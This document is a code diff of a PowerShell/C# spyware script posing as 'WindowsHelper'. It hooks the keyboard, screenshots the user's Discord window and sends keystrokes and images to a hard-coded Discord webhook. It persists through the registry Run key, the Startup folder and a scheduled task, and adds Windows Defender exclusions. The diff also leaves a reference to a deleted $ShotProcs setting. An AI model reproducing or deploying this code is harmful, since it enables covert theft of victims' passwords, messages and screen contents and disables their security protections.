@@ -1,16 +1,18 @@
 $ErrorActionPreference = 'SilentlyContinue'
-
 # ======================= CONFIG =======================
-$Webhook     = "https://discord.com/api/webhooks/1569542381072814221/6QObZS_5JMHMQOJ3y_Pog5PyLgiesDP-uaC802RQTSY5afaU20eZTa9CqcsNXjIbwZif"
-# Foreground process names to screenshot. "*" = everything.
-$ShotProcs   = @("chrome","msedge","firefox","brave","opera","vivaldi",
-                 "keepassxc","1password","bitwarden","discord","slack","teams",
-                 "code","excel","notepad")
-$TitleRx     = ""      # optional regex on window title, "" = ignore
-$ShotSec     = 30      # min seconds between screenshots
-$KeySec      = 60      # seconds between keystroke batches
-$Quality     = 55      # JPEG quality 1-100
-$MaxWidth    = 1600    # downscale width, keeps files small
+$Webhooks    = @("https://discord.com/api/webhooks/1569542381072814221/6QObZS_5JMHMQOJ3y_Pog5PyLgiesDP-uaC802RQTSY5afaU20eZTa9CqcsNXjIbwZif")   # add a 2nd to alternate
+$ArmProcs    = @("discord")        # processes that arm high-rate capture
+$ArmMode     = "foreground"        # "foreground" = only while focused, "process" = while running at all
+$WindowOnly  = $true               # capture just the Discord window, not the whole screen
+$ActiveShot  = 4                   # seconds between shots while armed
+$IdleShot    = 60                  # seconds between shots while unarmed
+$IdleCapture = $false              # $false = no shots at all when unarmed
+$KeyPauseMs  = 1200                # flush keystrokes after this much typing silence
+$MaxBufChars = 4000                # force a flush if the buffer gets this big
+$MaxFlushSec = 30                  # backstop: never hold keys longer than this
+$Quality     = 45
+$MaxWidth    = 1280
+$TitleRx     = ""
 # ======================================================
 
 $Dir    = "$env:APPDATA\Microsoft\WindowsHelper"
@@ -19,17 +21,15 @@ $Vbs    = "$Dir\w.vbs"
 $Log    = "$Dir\keys.log"
 New-Item -ItemType Directory -Force -Path $Dir | Out-Null
 
-# ---- single instance ----
 $mtx = New-Object Threading.Mutex($false, "WinHelperAgent")
 if (-not $mtx.WaitOne(0)) { exit }
 
-# ---- self-copy ----
 $Self = $MyInvocation.MyCommand.Path
 if ($Self -and ($Self -ne $Target)) { Copy-Item $Self $Target -Force }
 
-# ---- C# engine ----
 $src = @'
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
@@ -43,13 +43,28 @@ using System.Windows.Forms;
 
 public class Agent
 {
-    public static string Webhook = "", LogFile = "", TitleRx = "";
+    public static string LogFile = "", TitleRx = "";
+    public static string[] Webhooks = new string[0];
     public static string[] Procs = new string[0];
-    public static int ShotSec = 30, KeySec = 60, Quality = 55, MaxWidth = 1600;
+    public static string[] ArmProcs = new string[0];
+    public static string ArmMode = "foreground";
+    public static bool WindowOnly = true, IdleCapture = false;
+    public static int ActiveShot = 4, IdleShot = 60;
+    public static int KeyPauseMs = 1200, MaxBufChars = 4000, MaxFlushSec = 30;
+    public static int Quality = 45, MaxWidth = 1280;
+
+    class Shot { public Bitmap Bmp; public string Title; public int Hash; }
 
     static readonly object _lk = new object();
+    static readonly object _ql = new object();
+    static readonly object _wl = new object();
     static StringBuilder _buf = new StringBuilder();
-    static DateTime _lastFlush = DateTime.Now, _lastShot = DateTime.MinValue;
+    static List<Shot> _shots = new List<Shot>();
+    static long _lastKeyTick = 0;
+    static long _firstKeyTick = 0;
+    static int _lastHash = 0;
+    static int _whIdx = 0;
+    static volatile bool _procArmed = false;
     static IntPtr _hook = IntPtr.Zero;
     delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
 
@@ -59,21 +74,53 @@ public class Agent
     [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
     [DllImport("user32.dll")] static extern int GetWindowThreadProcessId(IntPtr h, out uint pid);
     [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
+    [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr h, out RECT r);
     [DllImport("user32.dll")] static extern IntPtr GetKeyboardLayout(uint tid);
     [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int ToUnicodeEx(uint vk, uint sc, byte[] st, StringBuilder sb, int n, uint fl, IntPtr lay);
     [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] static extern IntPtr GetModuleHandle(string n);
+    [DllImport("user32.dll")] static extern bool SetProcessDPIAware();
+    [DllImport("shcore.dll")] static extern int SetProcessDpiAwareness(int v);
+    [DllImport("user32.dll")] static extern IntPtr SetProcessDpiAwarenessContext(IntPtr ctx);
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct RECT { public int Left, Top, Right, Bottom; }
+
+    static Agent()
+    {
+        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+        ServicePointManager.Expect100Continue = false;
+        ServicePointManager.DefaultConnectionLimit = 20;
+    }
 
     public static void Start()
     {
-        Thread h = new Thread(HookThread); h.IsBackground = true; h.SetApartmentState(ApartmentState.STA); h.Start();
-        Thread f = new Thread(FlushLoop);  f.IsBackground = true; f.Start();
-        Thread s = new Thread(ShotLoop);   s.IsBackground = true; s.Start();
+        try { SetProcessDpiAwarenessContext(new IntPtr(-4)); }
+        catch { try { SetProcessDpiAwareness(2); } catch { SetProcessDPIAware(); } }
+
+        Thread h = new Thread(HookThread); h.IsBackground = true; h.SetApartmentState(ApartmentState.STA); h.Priority = ThreadPriority.AboveNormal; h.Start();
+        Thread c = new Thread(CaptureLoop); c.IsBackground = true; c.Start();
+        Thread u = new Thread(UploadLoop);  u.IsBackground = true; u.Start();
+        if (ArmMode == "process") { Thread a = new Thread(ArmedPoll); a.IsBackground = true; a.Start(); }
     }
 
     static void HookThread()
     {
         _hook = SetWindowsHookEx(13, new LowLevelProc(HookProc), GetModuleHandle(null), 0);
         Application.Run();
+    }
+
+    static void ArmedPoll()
+    {
+        while (true)
+        {
+            bool found = false;
+            foreach (string p in ArmProcs)
+            {
+                try { if (Process.GetProcessesByName(p).Length > 0) { found = true; break; } } catch { }
+            }
+            _procArmed = found;
+            Thread.Sleep(4000);
+        }
     }
 
     static string Translate(int vk, int sc)
@@ -117,81 +164,197 @@ public class Agent
                 int sc = Marshal.ReadInt32(lParam, 4);
                 string s = Translate(vk, sc);
                 if (string.IsNullOrEmpty(s)) s = Special(vk);
-                if (!string.IsNullOrEmpty(s)) lock (_lk) _buf.Append(s);
+                if (!string.IsNullOrEmpty(s))
+                {
+                    lock (_lk)
+                    {
+                        if (_buf.Length == 0) _firstKeyTick = DateTime.Now.Ticks;
+                        _buf.Append(s);
+                    }
+                    Interlocked.Exchange(ref _lastKeyTick, DateTime.Now.Ticks);
+                }
             }
         }
         catch { }
         return CallNextHookEx(_hook, nCode, wParam, lParam);
     }
 
-    static void FlushLoop()
+    // ---- foreground helpers ----
+    static string ForegroundProc(out IntPtr hwnd, out string title)
     {
-        while (true)
-        {
-            Thread.Sleep(1000);
-            if ((DateTime.Now - _lastFlush).TotalSeconds < KeySec) continue;
-            _lastFlush = DateTime.Now;
-            string chunk;
-            lock (_lk)
-            {
-                if (_buf.Length == 0) continue;
-                chunk = _buf.ToString();
-                _buf.Length = 0;
-            }
-            try { File.AppendAllText(LogFile, chunk); } catch { }
-            string body = "**" + Environment.MachineName + "** `" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") +
-                          "`\n```\n" + Cut(chunk, 1700) + "\n```";
-            try { Post(body, "keys.txt", Encoding.UTF8.GetBytes(chunk), "text/plain"); } catch { }
-        }
+        hwnd = GetForegroundWindow();
+        title = "";
+        if (hwnd == IntPtr.Zero) return "";
+        uint pid;
+        GetWindowThreadProcessId(hwnd, out pid);
+        StringBuilder sb = new StringBuilder(512);
+        GetWindowText(hwnd, sb, 512);
+        title = sb.ToString();
+        try { return Process.GetProcessById((int)pid).ProcessName.ToLower(); } catch { return ""; }
     }
 
-    static bool Match(out string title)
+    static bool IsArmed(out IntPtr hwnd, out string title, out string fgProc)
     {
+        fgProc = ForegroundProc(out hwnd, out title);
+        if (ArmMode == "process") return _procArmed;
+        foreach (string p in ArmProcs)
+            if (fgProc == p.ToLower() || fgProc.Contains(p.ToLower())) return true;
+        return false;
+    }
+
+    static bool ShotAllowed(out string title)
+    {
+        IntPtr hwnd;
+        string fgProc;
         title = "";
-        IntPtr h = GetForegroundWindow();
-        if (h == IntPtr.Zero) return false;
-        uint pid; GetWindowThreadProcessId(h, out pid);
-        string name;
-        try { name = Process.GetProcessById((int)pid).ProcessName.ToLower(); } catch { return false; }
-        StringBuilder sb = new StringBuilder(512);
-        GetWindowText(h, sb, 512);
-        title = sb.ToString();
-        bool ok = false;
+        if (!IsArmed(out hwnd, out title, out fgProc)) return false;
+        bool procOk = false;
         foreach (string p in Procs)
-            if (p == "*" || name.Contains(p.ToLower())) { ok = true; break; }
-        if (!ok) return false;
+            if (p == "*" || fgProc.Contains(p.ToLower())) { procOk = true; break; }
+        if (!procOk) return false;
         if (TitleRx != "" && !Regex.IsMatch(title, TitleRx, RegexOptions.IgnoreCase)) return false;
         return true;
     }
 
-    static void ShotLoop()
+    // ---- capture ----
+    static void CaptureLoop()
     {
+        Stopwatch sw = Stopwatch.StartNew();
         while (true)
         {
-            Thread.Sleep(1000);
-            if ((DateTime.Now - _lastShot).TotalSeconds < ShotSec) continue;
-            string title;
-            if (!Match(out title)) continue;
-            _lastShot = DateTime.Now;
-            byte[] jpg;
-            try { jpg = Grab(); } catch { continue; }
-            if (jpg == null || jpg.Length == 0) continue;
-            string body = "**Screenshot** `" + DateTime.Now.ToString("HH:mm:ss") + "`\n" + Cut(title, 200);
-            try { Post(body, "shot_" + DateTime.Now.ToString("HHmmss") + ".jpg", jpg, "image/jpeg"); } catch { }
+            IntPtr hwnd; string title, fgProc;
+            bool armed = IsArmed(out hwnd, out title, out fgProc);
+            if (!armed && !IdleCapture) { Thread.Sleep(700); continue; }
+
+            int interval = armed ? ActiveShot : IdleShot;
+            long due = (long)interval * 1000 - sw.ElapsedMilliseconds;
+            if (due > 0) { Thread.Sleep((int)Math.Min(due, 400L)); continue; }
+            sw.Restart();
+
+            string t;
+            if (!ShotAllowed(out t)) continue;
+
+            Bitmap bmp;
+            try { bmp = Grab(hwnd, WindowOnly && armed); } catch { continue; }
+            if (bmp == null) continue;
+
+            int hh = Hash(bmp);
+            if (hh == _lastHash) { bmp.Dispose(); continue; }
+            _lastHash = hh;
+
+            Shot s = new Shot(); s.Bmp = bmp; s.Title = t; s.Hash = hh;
+            lock (_ql)
+            {
+                if (_shots.Count >= 2) { _shots[0].Bmp.Dispose(); _shots.RemoveAt(0); }
+                _shots.Add(s);
+            }
         }
     }
 
-    static byte[] Grab()
+    static int Hash(Bitmap bmp)
     {
-        Rectangle b = SystemInformation.VirtualScreen;
-        Bitmap bmp = new Bitmap(b.Width, b.Height, PixelFormat.Format24bppRgb);
-        using (Graphics g = Graphics.FromImage(bmp))
-            g.CopyFromScreen(b.X, b.Y, 0, 0, b.Size, CopyPixelOperation.SourceCopy);
-        if (bmp.Width > MaxWidth)
+        int h = 17;
+        int stepX = Math.Max(1, bmp.Width / 120);
+        int stepY = Math.Max(1, bmp.Height / 80);
+        for (int y = 0; y < bmp.Height; y += stepY)
+            for (int x = 0; x < bmp.Width; x += stepX)
+                h = h * 31 + bmp.GetPixel(x, y).ToArgb();
+        return h;
+    }
+
+    static Bitmap Grab(IntPtr hwnd, bool windowOnly)
+    {
+        Rectangle vs = SystemInformation.VirtualScreen;
+        Rectangle r = vs;
+        if (windowOnly && hwnd != IntPtr.Zero)
         {
-            int nh = (int)(bmp.Height * ((double)MaxWidth / bmp.Width));
-            Bitmap small = new Bitmap(bmp, MaxWidth, nh);
-            bmp.Dispose(); bmp = small;
+            RECT wr;
+            if (GetWindowRect(hwnd, out wr))
+            {
+                Rectangle w = Rectangle.FromLTRB(wr.Left, wr.Top, wr.Right, wr.Bottom);
+                w.Intersect(vs);
+                if (w.Width >= 200 && w.Height >= 150) r = w;
+            }
+        }
+        if (r.Width < 100 || r.Height < 100) r = new Rectangle(0, 0, 1920, 1080);
+
+        Bitmap bmp = new Bitmap(r.Width, r.Height, PixelFormat.Format24bppRgb);
+        using (Graphics g = Graphics.FromImage(bmp))
+            g.CopyFromScreen(r.X, r.Y, 0, 0, r.Size, CopyPixelOperation.SourceCopy);
+        return bmp;
+    }
+
+    // ---- upload ----
+    static void UploadLoop()
+    {
+        while (true)
+        {
+            Thread.Sleep(200);
+
+            bool haveKeys, haveShot;
+            lock (_lk) haveKeys = _buf.Length > 0;
+            lock (_ql) haveShot = _shots.Count > 0;
+            if (!haveKeys && !haveShot) continue;
+
+            if (haveKeys)
+            {
+                long idleMs = (DateTime.Now.Ticks - Interlocked.Read(ref _lastKeyTick)) / TimeSpan.TicksPerMillisecond;
+                long heldMs = (DateTime.Now.Ticks - Interlocked.Read(ref _firstKeyTick)) / TimeSpan.TicksPerMillisecond;
+                int blen; lock (_lk) blen = _buf.Length;
+
+                if (idleMs < KeyPauseMs && blen < MaxBufChars && heldMs < MaxFlushSec * 1000)
+                {
+                    if (!haveShot) continue;   // a pending frame can go immediately
+                    // otherwise let the frame ride along with the next key batch
+                    long wait = KeyPauseMs - idleMs;
+                    if (wait > 0) { Thread.Sleep((int)Math.Min(wait, 300)); continue; }
+                }
+            }
+
+            string keys = null;
+            lock (_lk) { if (_buf.Length > 0) { keys = _buf.ToString(); _buf.Length = 0; } }
+
+            Shot shot = null;
+            lock (_ql) { if (_shots.Count > 0) { shot = _shots[0]; _shots.RemoveAt(0); } }
+
+            if (keys == null && shot == null) continue;
+
+            List<string> names = new List<string>();
+            List<byte[]> datas = new List<byte[]>();
+            List<string> mimes = new List<string>();
+            StringBuilder content = new StringBuilder();
+
+            if (keys != null)
+            {
+                try { File.AppendAllText(LogFile, keys); } catch { }
+                content.Append("**" + Environment.MachineName + "** `" + DateTime.Now.ToString("HH:mm:ss") + "`\n```\n" + Cut(keys, 1500) + "\n```");
+                names.Add("keys.txt"); datas.Add(Encoding.UTF8.GetBytes(keys)); mimes.Add("text/plain");
+            }
+            if (shot != null)
+            {
+                byte[] jpg = null;
+                try { jpg = Encode(shot.Bmp); } catch { }
+                shot.Bmp.Dispose();
+                if (jpg != null && jpg.Length > 0)
+                {
+                    if (content.Length > 0) content.Append("\n");
+                    content.Append("**Screenshot** `" + DateTime.Now.ToString("HH:mm:ss") + "` " + Cut(shot.Title, 180));
+                    names.Add("shot_" + DateTime.Now.ToString("HHmmss") + ".jpg"); datas.Add(jpg); mimes.Add("image/jpeg");
+                }
+            }
+            if (datas.Count == 0) continue;
+
+            try { Post(content.ToString(), names.ToArray(), datas.ToArray(), mimes.ToArray()); } catch { }
+        }
+    }
+
+    static byte[] Encode(Bitmap bmp)
+    {
+        Bitmap src = bmp;
+        if (src.Width > MaxWidth)
+        {
+            int nh = (int)(src.Height * ((double)MaxWidth / src.Width));
+            src = new Bitmap(bmp, MaxWidth, nh);
         }
         ImageCodecInfo codec = null;
         foreach (ImageCodecInfo c in ImageCodecInfo.GetImageEncoders())
@@ -199,8 +362,8 @@ public class Agent
         EncoderParameters ep = new EncoderParameters(1);
         ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)Quality);
         MemoryStream ms = new MemoryStream();
-        if (codec != null) bmp.Save(ms, codec, ep); else bmp.Save(ms, ImageFormat.Jpeg);
-        bmp.Dispose();
+        if (codec != null) src.Save(ms, codec, ep); else src.Save(ms, ImageFormat.Jpeg);
+        if (src != bmp) src.Dispose();
         return ms.ToArray();
     }
 
@@ -220,25 +383,41 @@ public class Agent
         return sb.Append('"').ToString();
     }
 
-    static void Post(string content, string fname, byte[] data, string mime)
+    static string NextHook()
+    {
+        lock (_wl) { string u = Webhooks[_whIdx % Webhooks.Length]; _whIdx++; return u; }
+    }
+
+    public static void Post(string content, string[] names, byte[][] datas, string[] mimes)
     {
         string bnd = "----" + Guid.NewGuid().ToString("N");
-        string json = "{\"content\":" + Q(content) + "}";
         MemoryStream ms = new MemoryStream();
         byte[] pre = Encoding.UTF8.GetBytes("--" + bnd + "\r\nContent-Disposition: form-data; name=\"payload_json\"\r\n\r\n" +
-                     json + "\r\n--" + bnd + "\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\"" +
-                     fname + "\"\r\nContent-Type: " + mime + "\r\n\r\n");
+                     "{\"content\":" + Q(content) + "}\r\n");
         ms.Write(pre, 0, pre.Length);
-        if (data != null && data.Length > 0) ms.Write(data, 0, data.Length);
-        byte[] tail = Encoding.UTF8.GetBytes("\r\n--" + bnd + "--\r\n");
+
+        for (int i = 0; i < names.Length; i++)
+        {
+            byte[] hdr = Encoding.UTF8.GetBytes("--" + bnd + "\r\nContent-Disposition: form-data; name=\"files[" + i +
+                          "]\"; filename=\"" + names[i] + "\"\r\nContent-Type: " + mimes[i] + "\r\n\r\n");
+            ms.Write(hdr, 0, hdr.Length);
+            ms.Write(datas[i], 0, datas[i].Length);
+            ms.Write(new byte[] { 13, 10 }, 0, 2);
+        }
+        byte[] tail = Encoding.UTF8.GetBytes("--" + bnd + "--\r\n");
         ms.Write(tail, 0, tail.Length);
         byte[] all = ms.ToArray();
 
-        HttpWebRequest req = (HttpWebRequest)WebRequest.Create(Webhook);
+        HttpWebRequest req = (HttpWebRequest)WebRequest.Create(NextHook());
+        req.Proxy = null;
+        req.KeepAlive = true;
+        req.ServicePoint.ConnectionLimit = 20;
         req.Method = "POST";
         req.ContentType = "multipart/form-data; boundary=" + bnd;
-        req.Timeout = 30000; req.ReadWriteTimeout = 30000;
+        req.Timeout = 30000;
+        req.ReadWriteTimeout = 30000;
         req.ContentLength = all.Length;
+
         using (Stream s = req.GetRequestStream()) s.Write(all, 0, all.Length);
         try { using (HttpWebResponse r = (HttpWebResponse)req.GetResponse()) { } }
         catch (WebException we)
@@ -253,16 +432,22 @@ public class Agent
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 Add-Type -TypeDefinition $src -ReferencedAssemblies System.Windows.Forms, System.Drawing -Language CSharp
 
-[Agent]::Webhook  = $Webhook
-[Agent]::LogFile  = $Log
-[Agent]::Procs    = $ShotProcs
-[Agent]::TitleRx  = $TitleRx
-[Agent]::ShotSec  = $ShotSec
-[Agent]::KeySec   = $KeySec
-[Agent]::Quality  = $Quality
-[Agent]::MaxWidth = $MaxWidth
+[Agent]::Webhooks    = $Webhooks
+[Agent]::LogFile     = $Log
+[Agent]::Procs       = $ShotProcs
+[Agent]::ArmProcs    = $ArmProcs
+[Agent]::ArmMode     = $ArmMode
+[Agent]::WindowOnly  = $WindowOnly
+[Agent]::IdleCapture = $IdleCapture
+[Agent]::ActiveShot  = $ActiveShot
+[Agent]::IdleShot    = $IdleShot
+[Agent]::KeyPauseMs  = $KeyPauseMs
+[Agent]::MaxBufChars = $MaxBufChars
+[Agent]::MaxFlushSec = $MaxFlushSec
+[Agent]::TitleRx     = $TitleRx
+[Agent]::Quality     = $Quality
+[Agent]::MaxWidth    = $MaxWidth
 
-# ---- persistence ----
 $vbsBody = 'Set s = CreateObject("WScript.Shell")' + "`r`n" +
            's.Run "powershell -w hidden -ep bypass -f ""' + $Target + '""", 0, False'
 Set-Content -Path $Vbs -Value $vbsBody -Encoding ASCII
@@ -270,12 +455,10 @@ Set-Content -Path $Vbs -Value $vbsBody -Encoding ASCII
 Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
                  -Name 'WindowsHelper' -Value ('wscript.exe "' + $Vbs + '"')
 
-$startup = [Environment]::GetFolderPath('Startup')
-Copy-Item $Vbs (Join-Path $startup 'WindowsHelper.vbs') -Force
+Copy-Item $Vbs (Join-Path ([Environment]::GetFolderPath('Startup')) 'WindowsHelper.vbs') -Force
 
 $admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
          ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-
 if ($admin) {
     schtasks /create /tn "WindowsHelper" /f /sc onlogon /rl highest `
         /tr ('wscript.exe "' + $Vbs + '"') 2>&1 | Out-Null
@@ -283,6 +466,10 @@ if ($admin) {
     Add-MpPreference -ExclusionProcess "powershell.exe" 2>&1 | Out-Null
 }
 
-# ---- run ----
 [Agent]::Start()
+
+$g = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$diag = "**agent up** $env:COMPUTERNAME — geometry $($g.Width)x$($g.Height), arm=$ArmMode"
+try { [Agent]::Post($diag, @("info.txt"), @([Text.Encoding]::UTF8.GetBytes($diag)), @("text/plain")) } catch {}
+
 while ($true) { Start-Sleep -Seconds 60 }
